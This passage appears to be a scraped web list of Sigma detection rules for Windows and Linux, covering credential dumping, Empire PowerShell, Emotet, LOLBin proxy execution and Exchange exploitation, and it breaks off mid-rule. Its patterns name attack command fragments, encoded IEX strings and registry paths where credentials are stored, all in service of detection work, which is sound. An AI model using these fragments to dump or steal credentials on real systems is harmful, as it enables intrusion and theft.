<li><a href="#">title:Dump Credentials from Windows Credential Manager With PowerShell id: 99c49d9c-34ea-45f7-84a7-4751ae6b2cbc status: experimental author: frack113 date: 2021/12/20 description: | Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_kiddie: ScriptBlockText|contains: - 'Get-PasswordVaultCredentials' - 'Get-CredManCreds' selection_rename_Password: ScriptBlockText|contains|all: - 'New-Object' - 'Windows.Security.Credentials.PasswordVault' selection_rename_credman: ScriptBlockText|contains|all: - 'New-Object' - 'Microsoft.CSharp.CSharpCodeProvider' - '[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())' - 'Collections.ArrayList' - 'System.CodeDom.Compiler.CompilerParameters' condition: 1 of selection_* falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1555 
<li><a href="#">title:Dump Office Macro Files from Commandline id: b1c50487-1967-4315-a026-6491686d860e status: experimental description: A office file with macro is created from a commandline or a script author: frack113 references: - - date: 2022/01/23 logsource: category: file_event product: windows detection: selection_ext: TargetFilename|endswith: - .docm - .dotm - .xlsm - .xltm - .potm - .pptm - .pptx selection_cmd: - Image|endswith: - \cmd.exe - \powershell.exe - ParentImage|endswith: - \cmd.exe - \powershell.exe condition: all of selection_* falsepositives: - Unknown level: medium tags: - attack.initial_access - attack.t1566.001 
<li><a href="#">title:Dumpert Process Dumper id: 2704ab9e-afe2-4854-a3b1-0c0706d03578 status: experimental description: Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory author: Florian Roth references: - - date: 2020/02/04 modified: 2021/12/08 tags: - attack.credential_access - attack.t1003.001 logsource: category: process_creation product: windows detection: selection: Hashes|contains: '09D278F9DE118EF09163C6140255C690' condition: selection falsepositives: - Very unlikely level: critical 
<li><a href="#">title:Dumpert Process Dumper id: 93d94efc-d7ad-4161-ad7d-1638c4f908d8 related: - id: 2704ab9e-afe2-4854-a3b1-0c0706d03578 type: derived status: experimental description: Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory author: Florian Roth references: - - date: 2020/02/04 modified: 2021/09/21 tags: - attack.credential_access - attack.t1003.001 logsource: category: file_event product: windows detection: selection: TargetFilename: C:\Windows\Temp\dumpert.dmp condition: selection falsepositives: - Very unlikely level: critical 
<li><a href="#">title:Dumping Process via Sqldumper.exe id: 23ceaf5c-b6f1-4a32-8559-f2ff734be516 status: test description: Detects process dump via legitimate sqldumper.exe binary author: Kirill Kiryanov, oscd.community references: - - - - date: 2020/10/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\sqldumper.exe' CommandLine|contains: - '0x0110' - '0x01100:40' condition: selection falsepositives: - Legitimate MSSQL Server actions level: medium tags: - attack.credential_access - attack.t1003.001 
<li><a href="#">title:DumpMinitool Usage id: dee0a7a3-f200-4112-a99b-952196d81e42 description: Detects the use of a Visual Studio bundled tool named DumpMinitool.exe status: experimental references: - - author: Florian Roth date: 2022/04/06 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\DumpMinitool.exe' selection_original_name: OriginalName: 'DumpMinitool.exe' selection_flags: CommandLine|contains|all: - ' --processId ' - ' --dumpType Full' condition: 1 of selection* falsepositives: - Unknown level: medium 
<li><a href="#">title:DumpStack.log Defender Evasion id: 4f647cfa-b598-4e12-ad69-c68dd16caef8 status: test description: Detects the use of the filename DumpStack.log to evade Microsoft Defender references: - tags: - attack.defense_evasion author: Florian Roth date: 2022/01/06 modified: 2022/06/17 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\DumpStack.log' selection_download: CommandLine|contains: ' -o DumpStack.log' condition: 1 of selection* falsepositives: - Unknown level: critical 
<li><a href="#">title:Dynamic C Sharp Compile Artefact id: e4a74e34-ecde-4aab-b2fb-9112dd01aed0 status: experimental description: | When C# is compiled dynamically, a .cmdline file will be created as a part of the process. Certain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution author: frack113 references: - date: 2022/01/09 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: '.cmdline' condition: selection falsepositives: - Unknown level: low tags: - attack.defense_evasion - attack.t1027.004 
<li><a href="#">title:Edit of .bash_profile and .bashrc id: e74e15cc-c4b6-4c80-b7eb-dfe49feb7fe9 status: test description: Detects change of user environment. Adversaries can insert code into these files to gain persistence each time a user logs in or opens a new shell. author: Peter Matkovski references: - 'MITRE Attack technique T1156; .bash_profile and .bashrc. ' date: 2019/05/12 modified: 2022/02/22 logsource: product: linux service: auditd detection: selection: type: 'PATH' name: - '/root/.bashrc' - '/root/.bash_profile' - '/root/.profile' - '/home/*/.bashrc' - '/home/*/.bash_profile' - '/home/*/.profile' - '/etc/profile' - '/etc/shells' - '/etc/bashrc' - '/etc/csh.cshrc' - '/etc/csh.login' condition: selection falsepositives: - Admin or User activity level: medium tags: - attack.s0003 - attack.persistence - attack.t1546.004 
<li><a href="#">title:EfsPotato Named Pipe id: 637f689e-b4a5-4a86-be0e-0100a0a33ba2 status: experimental description: Detects the pattern of a pipe name as used by the tool EfsPotato references: - - date: 2021/08/23 modified: 2022/06/20 author: Florian Roth logsource: product: windows category: pipe_created definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (), but it is worth verifying. You can also use other repo, e.g. , . How to test detection? You can check powershell script from this site ' detection: selection: PipeName|contains: - '\pipe\' - '\pipe\srvsvc' # more specific version (use only this one of the other causes too many false positives) filter: PipeName|contains: '\CtxShare' condition: selection and not filter tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 falsepositives: - Unknown level: high 
<li><a href="#">title:Elise Backdoor id: e507feb7-5f73-4ef6-a970-91bb6f6d744f status: test description: Detects Elise backdoor acitivty as used by APT32 author: Florian Roth references: - date: 2018/01/31 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image: 'C:\Windows\SysWOW64\cmd.exe' CommandLine|contains: '\Windows\Caches\NavShExt.dll ' selection2: CommandLine|endswith: '\AppData\Roaming\MICROS~1\Windows\Caches\NavShExt.dll,Setting' condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.g0030 - attack.g0050 - attack.s0081 - attack.execution - attack.t1059.003 
<li><a href="#">title:Emissary Panda Malware SLLauncher id: 9aa01d62-7667-4d3b-acb8-8cb5103e2014 status: test description: Detects the execution of DLL side-loading malware used by threat group Emissary Panda aka APT27 author: Florian Roth references: - - date: 2018/09/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\sllauncher.exe' Image|endswith: '\svchost.exe' condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1574.002 
<li><a href="#">title:Emotet Process Creation id: d02e8cf5-6099-48cf-9bfc-1eec2d0c7b18 status: stable description: Detects all Emotet like process executions that are not covered by the more generic rules author: Florian Roth date: 2019/09/30 modified: 2021/11/29 tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 references: - - - - logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - ' -e* PAA' - 'JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ' # $env:userprofile - 'QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA' # $env:userprofile - 'kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA' # $env:userprofile - 'IgAoACcAKgAnACkAOwAkA' # "('*');$ - 'IAKAAnACoAJwApADsAJA' # "('*');$ - 'iACgAJwAqACcAKQA7ACQA' # "('*');$ - 'JABGAGwAeAByAGgAYwBmAGQ' - 'PQAkAGUAbgB2ADoAdABlAG0AcAArACgA' # =$env:temp+( - '0AJABlAG4AdgA6AHQAZQBtAHAAKwAoA' # =$env:temp+( - '9ACQAZQBuAHYAOgB0AGUAbQBwACsAKA' # =$env:temp+( condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: high 
<li><a href="#">title:Emotet RunDLL32 Process Creation id: 54e57ce3-0672-46eb-a402-2c0948d5e3e9 description: Detecting Emotet DLL loading by looking for rundll32.exe processes with command lines ending in ,RunDLL or ,Control_RunDLL author: FPT.EagleEye status: test date: 2020/12/25 modified: 2021/11/17 references: - - tags: - attack.defense_evasion - attack.t1218.011 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' CommandLine|endswith: - ',RunDLL' - ',Control_RunDLL' # - ',#1' too generic - function load by ordinal is not Emotet specific filter_legitimate_dll: CommandLine|endswith: - '.dll,Control_RunDLL' - '.dll",Control_RunDLL' - '.dll'',Control_RunDLL' filter_ide: ParentImage|endswith: '\tracker.exe' #When Visual Studio compile NodeJS program, it might use MSBuild to create tracker.exe and then, the tracker.exe fork rundll32.exe condition: selection and not filter_ide and not filter_legitimate_dll falsepositives: - Unknown level: critical 
<li><a href="#">title:Empire Monkey id: 10152a7b-b566-438f-a33c-390b607d1c8d status: test description: Detects EmpireMonkey APT reported Activity author: Markus Neis references: - date: 2019/04/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_cutil: CommandLine|endswith: '/i:%APPDATA%\logs.txt scrobj.dll' Image|endswith: '\cutil.exe' selection_regsvr32: CommandLine|endswith: '/i:%APPDATA%\logs.txt scrobj.dll' Description: 'Microsoft(C) Registerserver' condition: 1 of selection* falsepositives: - Very Unlikely level: critical tags: - attack.defense_evasion - attack.t1218.010 
<li><a href="#">title:Empire PowerShell Launch Parameters id: 79f4ede3-402e-41c8-bc3e-ebbf5f162581 status: test description: Detects suspicious powershell command line parameters used in Empire author: Florian Roth references: - - - - date: 2019/04/20 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - ' -NoP -sta -NonI -W Hidden -Enc ' - ' -noP -sta -w 1 -enc ' - ' -NoP -NonI -W Hidden -enc ' - ' -noP -sta -w 1 -enc' - ' -enc SQB' - ' -nop -exec bypass -EncodedCommand ' condition: selection falsepositives: - Other tools that incidentally use the same command line parameters level: high tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Empire PowerShell UAC Bypass id: 3268b746-88d8-4cd3-bffc-30077d02c787 status: stable description: Detects some Empire PowerShell UAC bypass methods author: Ecco references: - - date: 2019/08/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - ' -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update)' - ' -NoP -NonI -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update);' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - car.2019-04-001 
<li><a href="#">title:Empire UserAgent URI Combo id: b923f7d6-ac89-4a50-a71a-89fb846b4aa8 status: test description: Detects user agent and URI paths used by empire agents author: Florian Roth references: - date: 2020/07/13 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent: 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' cs-uri-query: - '/admin/get.php' - '/news.php' - '/login/process.php' cs-method: 'POST' condition: selection fields: - c-uri - c-ip falsepositives: - Valid requests with this exact user agent to server scripts of the defined names level: high tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Empty User Agent id: 21e44d78-95e7-421b-a464-ffd8395659c4 status: test description: Detects suspicious empty user agent strings in proxy logs author: Florian Roth references: - date: 2017/07/08 modified: 2021/11/27 logsource: category: proxy detection: selection: # Empty string - as used by Powershell's (New-Object Net.WebClient).DownloadString c-useragent: '' condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Enable Microsoft Dynamic Data Exchange id: 63647769-326d-4dde-a419-b925cc0caf42 description: Enable Dynamic Data Exchange protocol (DDE) in all supported editions of Microsoft Word or Excel. author: frack113 date: 2022/02/26 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection_word: EventType: SetValue TargetObject|endswith: \Word\Security\AllowDDE Details: - DWORD (0x00000001) - DWORD (0x00000002) selection_excel: EventType: SetValue TargetObject|endswith: - \Excel\Security\DisableDDEServerLaunch - \Excel\Security\DisableDDEServerLookup Details: DWORD (0x00000000) condition: 1 of selection_* falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1559.002 
<li><a href="#">title:Enable Windows Remote Management id: 991a9744-f2f0-44f2-bd33-9092eba17dc3 status: experimental description: Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user. references: - - author: frack113 date: 2022/01/07 logsource: product: windows category: ps_script definition: 'Script block logging must be enabled' detection: selection_cmdlet: ScriptBlockText|contains: 'Enable-PSRemoting ' condition: selection_cmdlet falsepositives: - Legitimate script level: medium tags: - attack.lateral_movement - attack.t1021.006 
<li><a href="#">title:Enabled User Right in AD to Control User Objects id: 311b6ce2-7890-4383-a8c2-663a9f6b43cd status: test description: Detects scenario where if a user is assigned the SeEnableDelegationPrivilege right in Active Directory it would allow control of other AD user objects. author: '@neu5ron' references: - date: 2017/07/30 modified: 2021/12/02 logsource: product: windows service: security definition: 'Requirements: Audit Policy : Policy Change > Audit Authorization Policy Change, Group Policy : Computer Configuration\Windows Settings\Security Settings\Advanced Audit Policy Configuration\Audit Policies\Policy Change\Audit Authorization Policy Change' detection: selection_base: EventID: 4704 selection_keywords: PrivilegeList|contains: 'SeEnableDelegationPrivilege' condition: all of selection* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1098 
<li><a href="#">title:Enabling COR Profiler Environment Variables id: ad89044a-8f49-4673-9a55-cbd88a1b374f status: test description: This rule detects cor_enable_profiling and cor_profiler environment variables being set and configured. author: Jose Rodriguez (@Cyb3rPandaH), OTR (Open Threat Research) references: - - - date: 2020/09/10 modified: 2022/06/26 logsource: category: registry_set product: windows detection: selection: EventType: Setvalue TargetObject|endswith: - '\COR_ENABLE_PROFILING' - '\COR_PROFILER' condition: selection level: high tags: - attack.persistence - attack.privilege_escalation - attack.defense_evasion - attack.t1574.012 
<li><a href="#">title:Enabling RDP Service via Reg.exe id: 0d5675be-bc88-4172-86d3-1e96a4476536 status: experimental description: Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host author: '@Kostastsale, @TheDFIRReport, slightly modified by pH-T' references: - date: 2022/02/12 modified: 2022/03/15 logsource: product: windows category: process_creation detection: selection1: Image|endswith: '\reg.exe' CommandLine|contains|all: - ' add ' - '\SYSTEM\CurrentControlSet\Control\Terminal Server' - 'REG_DWORD' - ' /f' selection2: CommandLine|contains|all: - 'Licensing Core' - 'EnableConcurrentSessions' selection3: CommandLine|contains: - 'WinStations\RDP-Tcp' - 'MaxInstanceCount' - 'fEnableWinStation' - 'TSUserEnabled' - 'TSEnabled' - 'TSAppCompat' - 'IdleWinStationPoolCount' - 'TSAdvertise' - 'AllowTSConnections' - 'fSingleSessionPerUser' condition: selection1 and (selection2 or selection3) falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.lateral_movement - attack.t1021.001 - attack.t1112 
<li><a href="#">title:Encoded FromBase64String id: fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c status: test description: Detects a base64 encoded FromBase64String keyword in a process command line author: Florian Roth date: 2019/08/24 modified: 2022/03/07 logsource: category: process_creation product: windows detection: selection: - CommandLine|base64offset|contains: '::FromBase64String' # UTF-16 LE - CommandLine|contains: - 'OgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcA' - 'oAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnA' - '6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1140 - attack.execution - attack.t1059.001 
<li><a href="#">title:Encoded IEX id: 88f680b8-070e-402c-ae11-d2914f2257f1 status: test description: Detects a base64 encoded IEX command string in a process command line author: Florian Roth date: 2019/08/23 modified: 2022/03/07 logsource: category: process_creation product: windows detection: selection: - CommandLine|base64offset|contains: - 'IEX ([' - 'iex ([' - 'iex (New' - 'IEX (New' # UTF16 LE - CommandLine|contains: - 'SQBFAFgAIAAoAFsA' - 'kARQBYACAAKABbA' - 'JAEUAWAAgACgAWw' - 'aQBlAHgAIAAoAFsA' - 'kAZQB4ACAAKABbA' - 'pAGUAeAAgACgAWw' - 'aQBlAHgAIAAoAE4AZQB3A' - 'kAZQB4ACAAKABOAGUAdw' - 'pAGUAeAAgACgATgBlAHcA' - 'SQBFAFgAIAAoAE4AZQB3A' - 'kARQBYACAAKABOAGUAdw' - 'JAEUAWAAgACgATgBlAHcA' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Encoded PowerShell Command Line id: cdf05894-89e7-4ead-b2b0-0a5f97a90f2f status: test description: Detects specific combinations of encoding methods in the PowerShell command lines author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community references: - date: 2020/10/11 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\powershell.exe' CommandLine|contains|all: - 'char' - 'join' selection2: Image|endswith: '\powershell.exe' CommandLine|contains: - 'ToInt' - 'ToDecimal' - 'ToByte' - 'ToUint' - 'ToSingle' - 'ToSByte' selection3: Image|endswith: '\powershell.exe' CommandLine|contains: - 'ToChar' - 'ToString' - 'String' selection4: Image|endswith: '\powershell.exe' CommandLine|contains|all: - 'split' - 'join' selection5: Image|endswith: '\powershell.exe' CommandLine|contains|all: - 'ForEach' - 'Xor' selection6: Image|endswith: '\powershell.exe' CommandLine|contains: 'cOnvErTTO-SECUreStRIng' condition: (selection2 and selection3) or selection1 or selection4 or selection5 or selection6 falsepositives: - Unlikely level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Enumerate Credentials from Windows Credential Manager With PowerShell id: 603c6630-5225-49c1-8047-26c964553e0e status: experimental author: frack113 date: 2021/12/20 description: | Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_cmd: ScriptBlockText|contains|all: - vaultcmd - '/listcreds:' selection_option: ScriptBlockText|contains: - 'Windows Credentials' - 'Web Credentials' condition: all of selection_* falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1555 
<li><a href="#">title:Enumeration for 3rd Party Creds From CLI id: 87a476dc-0079-4583-a985-dee7a20a03de related: - id: e0b0c2ab-3d52-46d9-8cb7-049dc775fbd1 type: derived status: experimental description: Detects processes that query known 3rd party registry keys that holds credentials via commandline references: - - - - author: Nasreddine Bencherchali date: 2022/06/20 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # Add more paths as they are discovered - '\Software\SimonTatham\PuTTY\Sessions' - '\Software\\SimonTatham\\PuTTY\SshHostKeys\' - '\Software\Mobatek\MobaXterm\' - '\Software\WOW6432Node\Radmin\v3.0\Server\Parameters\Radmin' - '\Software\Aerofox\FoxmailPreview' - '\Software\Aerofox\Foxmail\V3.1' - '\Software\IncrediMail\Identities' - '\Software\Qualcomm\Eudora\CommandLine' - '\Software\RimArts\B2\Settings' - '\Software\OpenVPN-GUI\configs' - '\Software\Martin Prikryl\WinSCP 2\Sessions' - '\Software\FTPWare\COREFTP\Sites' - '\Software\DownloadManager\Passwords' - '\Software\OpenSSH\Agent\Keys' - '\Software\TightVNC\Server' - '\Software\ORL\WinVNC3\Password' - '\Software\RealVNC\WinVNC4' condition: selection falsepositives: - Unlikely level: medium tags: - attack.credential_access - attack.t1552.002 
<li><a href="#">title:Enumeration for Credentials in Registry id: e0b0c2ab-3d52-46d9-8cb7-049dc775fbd1 status: experimental description: | Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services references: - author: frack113 date: 2021/12/20 logsource: category: process_creation product: windows detection: reg: Image|endswith: \reg.exe CommandLine|contains|all: - ' query ' - '/t ' - 'REG_SZ' - '/s' hive: - CommandLine|contains|all: - '/f ' - 'HKLM' - CommandLine|contains|all: - '/f ' - 'HKCU' - CommandLine|contains: 'HKCU\Software\SimonTatham\PuTTY\Sessions' condition: reg and hive falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1552.002 
<li><a href="#">title:Enumeration via the Global Catalog description: Detects enumeration of the global catalog (that can be performed using BloodHound or others AD reconnaissance tools). Adjust Threshold according to domain width. status: experimental author: Chakib Gzenayi (@Chak092), Hosni Mribah id: 619b020f-0fd7-4f23-87db-3f51ef837a34 date: 2020/05/11 modified: 2021/06/01 references: - tags: - attack.discovery - attack.t1087.002 logsource: product: windows service: security definition: 'The advanced audit policy setting "Windows Filtering Platform > Filtering Platform Connection" must be configured for Success' detection: selection: EventID: 5156 DestinationPort: - 3268 - 3269 timeframe: 1h condition: selection falsepositives: - Exclude known DCs. level: medium 
<li><a href="#">title:Equation Editor Network Connection id: a66bc059-c370-472c-a0d7-f8fd1bf9d583 status: experimental description: Detects network connections from Equation Editor author: Max Altgelt references: - - date: 2022/04/14 logsource: category: network_connection product: windows detection: selection: Image|endswith: '\eqnedt32.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1203 
<li><a href="#">title:Equation Group DLL_U Load id: d465d1d8-27a2-4cca-9621-a800f37cf72e status: stable description: Detects a specific tool and export used by EquationGroup author: Florian Roth references: - - - date: 2019/03/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\rundll32.exe' CommandLine|endswith: ',dll_u' selection2: CommandLine|contains: ' -export dll_u ' condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.g0020 - attack.defense_evasion - attack.t1218.011 
<li><a href="#">title:Esentutl Gather Credentials id: 7df1713a-1a5b-4a4b-a071-dc83b144a101 status: experimental author: sam0x90 date: 2021/08/06 description: Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab. references: - - - tags: - attack.credential_access - attack.t1003 - attack.t1003.003 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'esentutl' - ' /p' condition: selection falsepositives: - To be determined level: medium fields: - User - CommandLine - ParentCommandLine - CurrentDirectory 
<li><a href="#">title:Esentutl Steals Browser Information id: 6a69f62d-ce75-4b57-8dce-6351eb55b362 status: experimental description: One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe references: - - author: frack113 date: 2022/02/13 modified: 2022/05/12 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\esentutl.exe' - OriginalFileName: 'esentutl.exe' selection_cli: CommandLine|contains|all: - '/r ' - '\Windows\WebCache' condition: all of selection* falsepositives: - Legitimate use level: medium tags: - attack.collection - attack.t1005 
<li><a href="#">title:Esentutl Volume Shadow Copy Service Keys id: 5aad0995-46ab-41bd-a9ff-724f41114971 description: Detects the volume shadow copy service initialization and processing via esentutl. Registry keys such as HKLM\\System\\CurrentControlSet\\Services\\VSS\\Diag\\VolSnap\\Volume are captured. status: experimental date: 2020/10/20 modified: 2021/12/08 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.credential_access - attack.t1003.002 references: - logsource: category: registry_event product: windows detection: selection: TargetObject|contains: 'System\CurrentControlSet\Services\VSS' Image|endswith: 'esentutl.exe' # limit esentutl as in references, too many FP to filter filter: TargetObject|contains: 'System\CurrentControlSet\Services\VSS\Start' condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Eventlog Cleared id: a62b37e0-45d3-48d9-a517-90c1a1b0186b related: - id: f2f01843-e7b8-4f95-a35a-d23584476423 type: obsoletes - id: d99b79d2-0a6f-4f46-ad8b-260b6e17f982 type: derived description: One of the Windows Eventlogs has been cleared. e.g. caused by "wevtutil cl" command execution status: experimental references: - - author: Florian Roth date: 2017/01/10 modified: 2022/01/07 tags: - attack.defense_evasion - attack.t1070.001 - car.2016-04-002 logsource: product: windows service: system detection: selection: EventID: 104 Provider_Name: Microsoft-Windows-Eventlog condition: selection falsepositives: - Rollout of log collection agents (the setup routine often includes a reset of the local Eventlog) - System provisioning (system reset before the golden image creation) level: low 
<li><a href="#">title:EvilNum Golden Chickens Deployment via OCX Files id: 8acf3cfa-1e8c-4099-83de-a0c4038e18f0 status: test description: Detects Golden Chickens deployment method as used by Evilnum in report published in July 2020 author: Florian Roth references: - - date: 2020/07/10 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'regsvr32' - '/s' - '/i' - '\AppData\Roaming\' - '.ocx' condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1218.011 
<li><a href="#">title:Excel Network Connections id: 75e33ce3-ae32-4dcc-9aa8-a2a3029d6f84 status: experimental description: Detects an Excel process that opens suspicious network connections to non-private IP addresses, and attempts to cover CVE-2021-42292. You will likely have to tune this rule for your organization, but it is certainly something you should look for and could have applications for malicious activity beyond CVE-2021-42292. author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Florian Roth '@Neo23x0", Tim Shelton date: 2021/11/10 modified: 2022/06/27 references: - tags: - attack.execution - attack.t1203 logsource: category: network_connection product: windows detection: selection: Image|endswith: '\excel.exe' Initiated: 'true' DestinationIsIpv6: 'false' filter: DestinationIp|startswith: - '10.' - '192.168.' - '172.16.' - '172.17.' - '172.18.' - '172.19.' - '172.20.' - '172.21.' - '172.22.' - '172.23.' - '172.24.' - '172.25.' - '172.26.' - '172.27.' - '172.28.' - '172.29.' - '172.30.' - '172.31.' - '127.0.0.1' condition: selection and not filter falsepositives: - You may have to tune certain domains out that Excel may call out to, such as microsoft or other business use case domains. - Office documents commonly have templates that refer to external addresses, like sharepoint.ourcompany.com may have to be tuned. - It is highly recomended to baseline your activity and tune out common business use cases. level: medium 
<li><a href="#">title:Excel Proxy Executing Regsvr32 With Payload id: 9d1c72f5-43f0-4da5-9320-648cf2099dd0 description: Excel called wmic to finally proxy execute regsvr32 with the payload. An attacker wanted to break suspicious parent-child chain (Office app spawns LOLBin).But we have command-line in the event which allow us to "restore" this suspicious parent-child chain and detect it. Monitor process creation with "wmic process call create" and LOLBins in command-line with parent Office application processes. references: - - (aka_REvil)_Ransomware.yaml author: 'Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)' tags: - attack.t1204.002 - attack.t1047 - attack.t1218.010 - attack.execution - attack.defense_evasion status: experimental date: 2021/08/23 modified: 2022/06/27 logsource: product: windows category: process_creation detection: #useful_information: add more LOLBins to the rules logic of your choice. selection_img: - Image|endswith: '\wbem\WMIC.exe' - OriginalFileName: 'wmic.exe' selection_other: CommandLine|contains: - 'regsvr32' - 'rundll32' - 'msiexec' - 'mshta' - 'verclsid' ParentImage|endswith: - '\winword.exe' - '\excel.exe' - '\powerpnt.exe' CommandLine|contains|all: - 'process' - 'create' - 'call' condition: all of selection_* falsepositives: - Unknown level: high 
<li><a href="#">title:Excel Proxy Executing Regsvr32 With Payload id: c0e1c3d5-4381-4f18-8145-2583f06a1fe5 description: Excel called wmic to finally proxy execute regsvr32 with the payload. An attacker wanted to break suspicious parent-child chain (Office app spawns LOLBin).But we have command-line in the event which allow us to "restore" this suspicious parent-child chain and detect it. Monitor process creation with "wmic process call create" and LOLBins in command-line with parent Office application processes. references: - - (aka_REvil)_Ransomware.yaml author: 'Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)' tags: - attack.t1204.002 - attack.t1047 - attack.t1218.010 - attack.execution - attack.defense_evasion status: experimental date: 2021/08/23 modified: 2022/06/02 logsource: product: windows category: process_creation detection: #useful_information: add more LOLBins to the rules logic of your choice. selection1: CommandLine|contains: - 'regsvr32' - 'rundll32' - 'msiexec' - 'mshta' - 'verclsid' selection2: - Image|endswith: '\wbem\WMIC.exe' - CommandLine|contains: 'wmic ' selection3: ParentImage|endswith: - '\winword.exe' - '\excel.exe' - '\powerpnt.exe' selection4: CommandLine|contains|all: - 'process' - 'create' - 'call' condition: selection1 and selection2 and selection3 and selection4 falsepositives: - Unknown level: high 
<li><a href="#">title:Exchange Exploitation Activity id: bbb2dedd-a0e3-46ab-ba6c-6c82ae7a9aa7 description: Detects activity observed by different researchers to be HAFNIUM group activity (or related) on Exchange servers author: Florian Roth date: 2021/03/09 modified: 2021/03/16 status: experimental references: - - - - - logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - 'attrib' - ' +h ' - ' +s ' - ' +r ' - '.aspx' selection2: CommandLine|contains|all: - 'schtasks' - 'VSPerfMon' selection3: CommandLine|contains|all: - 'vssadmin list shadows' - 'Temp\__output' selection4: CommandLine|contains: '%TEMP%\execute.bat' selection5: Image|endswith: 'Users\Public\opera\Opera_browser.exe' selection6: Image|endswith: 'Opera_browser.exe' ParentImage|endswith: - '\services.exe' - '\svchost.exe' selection7: Image|contains: '\ProgramData\VSPerfMon\' selection8: CommandLine|contains|all: - ' -t7z ' - 'C:\Programdata\pst' - '\it.zip' selection9: Image|endswith: '\makecab.exe' CommandLine|contains: - 'Microsoft\Exchange Server\' - 'inetpub\wwwroot' selection10: CommandLine|contains: - '\Temp\xx.bat' - 'Windows\WwanSvcdcs' - 'Windows\Temp\cw.exe' selection11: CommandLine|contains|all: - '\comsvcs.dll' - 'Minidump' - '\inetpub\wwwroot' selection12: CommandLine|contains|all: - 'dsquery' - 